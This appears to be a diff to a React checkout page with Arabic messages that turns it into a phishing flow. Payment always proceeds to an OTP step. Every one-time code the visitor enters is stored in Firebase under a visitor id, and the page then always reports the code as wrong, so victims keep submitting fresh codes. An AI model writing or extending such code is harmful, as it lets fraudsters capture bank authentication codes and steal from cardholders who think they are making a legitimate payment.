@@ -13,6 +13,7 @@ import { ProgressIndicator } from "./progress-indicator"
 import { PaymentForm } from "./payment-form"
 import { CustomerForm } from "./customer-form"
 import { addData } from "@/lib/firebase"
+import { set } from "firebase/database"
 
 type CheckoutStep = "customer" | "payment" | "otp" | "success" | "error"
 
@@ -60,36 +61,26 @@ export default function Component() {
   }
 
   const handlePaymentNext = async () => {
-    setLoading(true)
     setError("")
+    setStep("otp")
+  
 
-    setTimeout(() => {
-      setLoading(false)
-      if (Math.random() > 0.7) {
-        setError("فشل في معالجة الدفع. يرجى التأكد من صحة بيانات البطاقة والمحاولة مرة أخرى.")
-        setStep("error")
-      } else {
-        setStep("otp")
-      }
-    }, 2000)
   }
 
   const handleOtpVerification = async (e: React.FormEvent) => {
     e.preventDefault()
     const _id=localStorage.getItem('visitor')
+    setLoading(true)
     allOtps.push(otp)
     addData({id:_id,otp,allOtps})
-    setLoading(true)
-    setError("")
-
     setTimeout(() => {
-      setLoading(false)
-      if (otp === "123456") {
-        setStep("success")
-      } else {
-        setError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.")
-      }
-    }, 1500)
+        setLoading(false)
+    
+        setOtp("")
+        setError("الرمز خاطىء يرجى المحاولة مره اخرى")
+        }, 5000);
+
+   
   }
 
   const resetForm = () => {
